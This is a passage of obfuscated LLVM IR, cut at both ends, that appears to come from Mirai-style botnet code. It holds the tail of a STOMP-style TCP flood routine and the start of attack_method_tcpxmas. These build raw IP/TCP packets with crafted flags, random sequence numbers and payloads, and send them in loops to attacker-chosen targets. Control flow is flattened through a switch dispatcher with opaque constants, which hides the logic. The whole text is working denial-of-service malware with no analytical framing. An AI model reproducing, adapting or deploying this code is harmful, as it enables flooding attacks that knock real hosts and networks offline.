  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i32 0, i32 6
  store i8 6, i8* %353, align 1
  %354 = load i32, i32* @LOCAL_ADDR, align 4
  %355 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  %357 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %358 = load i32, i32* %9, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %357, i64 %359
  %361 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 9
  store i32 %362, i32* %364, align 4
  %365 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %366 = load i32, i32* %9, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i32 0, i32 3
  %370 = load i16, i16* %369, align 4
  %371 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %372 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %371, i32 0, i32 0
  store i16 %370, i16* %372, align 4
  %373 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i32 0, i32 4
  %378 = load i16, i16* %377, align 2
  %379 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 1
  store i16 %378, i16* %380, align 2
  %381 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %382 = load i32, i32* %9, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %384, i32 0, i32 2
  %386 = load i32, i32* %385, align 4
  %387 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 2
  store i32 %386, i32* %388, align 4
  %389 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i32 0, i32 1
  %394 = load i32, i32* %393, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 3
  store i32 %394, i32* %396, align 4
  %397 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 4
  %399 = load i16, i16* %398, align 4
  %400 = and i16 %399, -241
  %401 = or i16 %400, 128
  store i16 %401, i16* %398, align 4
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 4
  %404 = load i16, i16* %403, align 4
  %405 = and i16 %404, -257
  %406 = or i16 %405, 256
  store i16 %406, i16* %403, align 4
  %407 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %408 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %407, i32 0, i32 4
  %409 = load i16, i16* %408, align 4
  %410 = and i16 %409, -4097
  %411 = or i16 %410, 4096
  store i16 %411, i16* %408, align 4
  %412 = call i32 @rand_next()
  %413 = and i32 %412, 65535
  %414 = trunc i32 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 5
  store i16 %414, i16* %416, align 2
  %417 = load i8, i8* %18, align 1
  %418 = sext i8 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 4
  %421 = load i16, i16* %420, align 4
  %422 = and i16 %418, 1
  %423 = shl i16 %422, 13
  %424 = and i16 %421, -8193
  %425 = or i16 %424, %423
  store i16 %425, i16* %420, align 4
  %426 = load i8, i8* %19, align 1
  %427 = sext i8 %426 to i16
  %428 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 4
  %430 = load i16, i16* %429, align 4
  %431 = and i16 %427, 1
  %432 = shl i16 %431, 12
  %433 = and i16 %430, -4097
  %434 = or i16 %433, %432
  store i16 %434, i16* %429, align 4
  %435 = load i8, i8* %20, align 1
  %436 = sext i8 %435 to i16
  %437 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %438 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %437, i32 0, i32 4
  %439 = load i16, i16* %438, align 4
  %440 = and i16 %436, 1
  %441 = shl i16 %440, 11
  %442 = and i16 %439, -2049
  %443 = or i16 %442, %441
  store i16 %443, i16* %438, align 4
  %444 = load i8, i8* %21, align 1
  %445 = sext i8 %444 to i16
  %446 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 4
  %448 = load i16, i16* %447, align 4
  %449 = and i16 %445, 1
  %450 = shl i16 %449, 10
  %451 = and i16 %448, -1025
  %452 = or i16 %451, %450
  store i16 %452, i16* %447, align 4
  %453 = load i8, i8* %22, align 1
  %454 = sext i8 %453 to i16
  %455 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 4
  %457 = load i16, i16* %456, align 4
  %458 = and i16 %454, 1
  %459 = shl i16 %458, 9
  %460 = and i16 %457, -513
  %461 = or i16 %460, %459
  store i16 %461, i16* %456, align 4
  %462 = load i8, i8* %23, align 1
  %463 = sext i8 %462 to i16
  %464 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %465 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %464, i32 0, i32 4
  %466 = load i16, i16* %465, align 4
  %467 = and i16 %463, 1
  %468 = shl i16 %467, 8
  %469 = and i16 %466, -257
  %470 = or i16 %469, %468
  store i16 %470, i16* %465, align 4
  %471 = load i8*, i8** %38, align 8
  %472 = load i32, i32* %24, align 4
  call void @rand_str(i8* %471, i32 %472)
  store i32 1275963823, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 4
  %476 = load i16, i16* %475, align 4
  %477 = lshr i16 %476, 8
  %478 = and i16 %477, 1
  %479 = zext i16 %478 to i32
  %480 = icmp ne i32 %479, 0
  %481 = select i1 %480, i32 -2013503910, i32 -529110717
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 4
  %485 = load i16, i16* %484, align 4
  %486 = lshr i16 %485, 10
  %487 = and i16 %486, 1
  %488 = zext i16 %487 to i32
  %489 = icmp ne i32 %488, 0
  %490 = select i1 %489, i32 -2013503910, i32 -1929067011
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32, i32* %26, align 4
  %493 = call i32 @close(i32 %492)
  store i32 -1596954355, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  store i32 1082864122, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  store i32 -549721651, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  store i32 -2117630366, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = call i64 @time(i64* null) #6
  %499 = load i64, i64* %31, align 8
  %500 = sub nsw i64 %498, %499
  %501 = icmp sgt i64 %500, 10
  %502 = select i1 %501, i32 -1469968066, i32 -434804735
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %26, align 4
  %505 = call i32 @close(i32 %504)
  store i32 -1596954355, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  store i32 -1994253768, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 -1210135771, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  %509 = load i32, i32* %9, align 4
  %510 = add nsw i32 %509, 1
  store i32 %510, i32* %9, align 4
  store i32 1030230775, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  store i32 1927460532, i32* %switchVar
  br label %loopEnd

; <label>:512:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1203624892, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load i32, i32* %9, align 4
  %515 = load i8, i8* %5, align 1
  %516 = zext i8 %515 to i32
  %517 = icmp slt i32 %514, %516
  %518 = select i1 %517, i32 335070428, i32 613166240
  store i32 %518, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i8**, i8*** %12, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds i8*, i8** %520, i64 %522
  %524 = load i8*, i8** %523, align 8
  store i8* %524, i8** %39, align 8
  %525 = load i8*, i8** %39, align 8
  %526 = bitcast i8* %525 to %struct.iphdr*
  store %struct.iphdr* %526, %struct.iphdr** %40, align 8
  %527 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %528 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %527, i64 1
  %529 = bitcast %struct.iphdr* %528 to %struct.tcphdr*
  store %struct.tcphdr* %529, %struct.tcphdr** %41, align 8
  %530 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i64 1
  %532 = bitcast %struct.tcphdr* %531 to i8*
  store i8* %532, i8** %42, align 8
  %533 = load i16, i16* %14, align 2
  %534 = zext i16 %533 to i32
  %535 = icmp eq i32 %534, 65535
  %536 = select i1 %535, i32 961280086, i32 -564897156
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  %538 = call i32 @rand_next()
  %539 = and i32 %538, 65535
  %540 = trunc i32 %539 to i16
  %541 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 3
  store i16 %540, i16* %542, align 4
  store i32 -564897156, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i8, i8* %25, align 1
  %545 = icmp ne i8 %544, 0
  %546 = select i1 %545, i32 -746464486, i32 259532904
  store i32 %546, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i8*, i8** %42, align 8
  %549 = load i32, i32* %24, align 4
  call void @rand_str(i8* %548, i32 %549)
  store i32 259532904, i32* %switchVar
  br label %loopEnd

; <label>:550:                                    ; preds = %loopEntry
  %551 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %552 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %551, i32 0, i32 7
  store i16 0, i16* %552, align 2
  %553 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %554 = bitcast %struct.iphdr* %553 to i16*
  %555 = call zeroext i16 @checksum_generic(i16* %554, i32 20)
  %556 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %557 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %556, i32 0, i32 7
  store i16 %555, i16* %557, align 2
  %558 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %559 = load i32, i32* %9, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %558, i64 %560
  %562 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %561, i32 0, i32 1
  %563 = load i32, i32* %562, align 4
  %564 = add i32 %563, 1
  store i32 %564, i32* %562, align 4
  %565 = trunc i32 %563 to i16
  %566 = call zeroext i16 @htons(i16 zeroext %565) #7
  %567 = zext i16 %566 to i32
  %568 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 2
  store i32 %567, i32* %569, align 4
  %570 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %571 = load i32, i32* %9, align 4
  %572 = sext i32 %571 to i64
  %573 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %570, i64 %572
  %574 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %573, i32 0, i32 2
  %575 = load i32, i32* %574, align 4
  %576 = trunc i32 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #7
  %578 = zext i16 %577 to i32
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 3
  store i32 %578, i32* %580, align 4
  %581 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %582 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %581, i32 0, i32 6
  store i16 0, i16* %582, align 4
  %583 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %584 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %585 = bitcast %struct.tcphdr* %584 to i8*
  %586 = load i32, i32* %24, align 4
  %587 = sext i32 %586 to i64
  %588 = add i64 20, %587
  %589 = trunc i64 %588 to i16
  %590 = call zeroext i16 @htons(i16 zeroext %589) #7
  %591 = load i32, i32* %24, align 4
  %592 = sext i32 %591 to i64
  %593 = add i64 20, %592
  %594 = trunc i64 %593 to i32
  %595 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %583, i8* %585, i16 zeroext %590, i32 %594)
  %596 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %597 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %596, i32 0, i32 6
  store i16 %595, i16* %597, align 4
  %598 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %599 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %598, i32 0, i32 1
  %600 = load i16, i16* %599, align 2
  %601 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %602 = load i32, i32* %9, align 4
  %603 = sext i32 %602 to i64
  %604 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i64 %603
  %605 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %604, i32 0, i32 0
  %606 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %605, i32 0, i32 1
  store i16 %600, i16* %606, align 2
  %607 = load i32, i32* %10, align 4
  %608 = load i8*, i8** %39, align 8
  %609 = load i32, i32* %24, align 4
  %610 = sext i32 %609 to i64
  %611 = add i64 40, %610
  %612 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %613 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %614 = load i32, i32* %9, align 4
  %615 = sext i32 %614 to i64
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %613, i64 %615
  %617 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %616, i32 0, i32 0
  %618 = bitcast %struct.sockaddr_in* %617 to %struct.sockaddr*
  store %struct.sockaddr* %618, %struct.sockaddr** %612, align 8
  %619 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %620 = load %struct.sockaddr*, %struct.sockaddr** %619, align 8
  %621 = call i64 @sendto(i32 %607, i8* %608, i64 %611, i32 16384, %struct.sockaddr* %620, i32 16)
  store i32 -2046271772, i32* %switchVar
  br label %loopEnd

; <label>:622:                                    ; preds = %loopEntry
  %623 = load i32, i32* %9, align 4
  %624 = add nsw i32 %623, 1
  store i32 %624, i32* %9, align 4
  store i32 -1203624892, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  store i32 1927460532, i32* %switchVar
  br label %loopEnd

; <label>:626:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %625, %622, %550, %547, %543, %537, %519, %513, %512, %511, %508, %507, %506, %503, %497, %496, %495, %494, %491, %482, %473, %351, %347, %255, %246, %237, %224, %219, %210, %209, %197, %189, %185, %180, %175, %166, %145, %129, %128, %124, %123, %117, %116, %113, %107, %106, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 809055596, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 809055596, label %first
    i32 -215271811, label %106
    i32 -1858511788, label %107
    i32 -465138085, label %113
    i32 -1804910310, label %116
    i32 362184990, label %117
    i32 -833294190, label %123
    i32 1197780694, label %124
    i32 -1624280745, label %128
    i32 -1915435194, label %129
    i32 -1689745497, label %145
    i32 1199067086, label %166
    i32 -591416081, label %175
    i32 -363286448, label %180
    i32 825608296, label %185
    i32 1288321756, label %189
    i32 1327349090, label %197
    i32 1473655135, label %209
    i32 1103872625, label %210
    i32 -1523174447, label %219
    i32 -324541366, label %224
    i32 922088958, label %237
    i32 866675674, label %246
    i32 126905619, label %255
    i32 1745512891, label %347
    i32 -1493026927, label %351
    i32 -1398811771, label %473
    i32 -2142629966, label %482
    i32 -193086114, label %491
    i32 -780568181, label %494
    i32 -98184415, label %495
    i32 -587858669, label %496
    i32 -1449395436, label %497
    i32 16822973, label %503
    i32 -2128764509, label %506
    i32 -1307758754, label %507
    i32 -994711834, label %508
    i32 1495372242, label %511
    i32 -899725029, label %512
    i32 1890303233, label %513
    i32 -1261005816, label %519
    i32 1165094115, label %537
    i32 -1794583658, label %543
    i32 -136280144, label %547
    i32 769611023, label %550
    i32 -540721314, label %622
    i32 -395070472, label %625
    i32 1201367086, label %626
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %104 = icmp eq i32 %.reload, -1
  %105 = select i1 %104, i32 -215271811, i32 -1858511788
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 1201367086, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  %112 = select i1 %111, i32 -465138085, i32 -1804910310
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %10, align 4
  %115 = call i32 @close(i32 %114)
  store i32 1201367086, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 362184990, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %9, align 4
  %119 = load i8, i8* %5, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %118, %120
  %122 = select i1 %121, i32 -833294190, i32 1495372242
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 1197780694, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %125, i32* %26, align 4
  %126 = icmp eq i32 %125, -1
  %127 = select i1 %126, i32 -1624280745, i32 -1915435194
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -994711834, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* %26, align 4
  %131 = load i32, i32* %26, align 4
  %132 = call i32 (i32, i32, ...) @fcntl(i32 %131, i32 3, i32 0)
  %133 = or i32 %132, 2048
  %134 = call i32 (i32, i32, ...) @fcntl(i32 %130, i32 4, i32 %133)
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %135, align 4
  %136 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %137 = load i32, i32* %9, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 2
  %141 = load i8, i8* %140, align 4
  %142 = zext i8 %141 to i32
  %143 = icmp slt i32 %142, 32
  %144 = select i1 %143, i32 -1689745497, i32 1199067086
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 1
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @ntohl(i32 %151) #7
  %153 = call i32 @rand_next()
  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 4
  %160 = zext i8 %159 to i32
  %161 = lshr i32 %153, %160
  %162 = add i32 %152, %161
  %163 = call i32 @htonl(i32 %162) #7
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %165 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %164, i32 0, i32 0
  store i32 %163, i32* %165, align 4
  store i32 -591416081, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
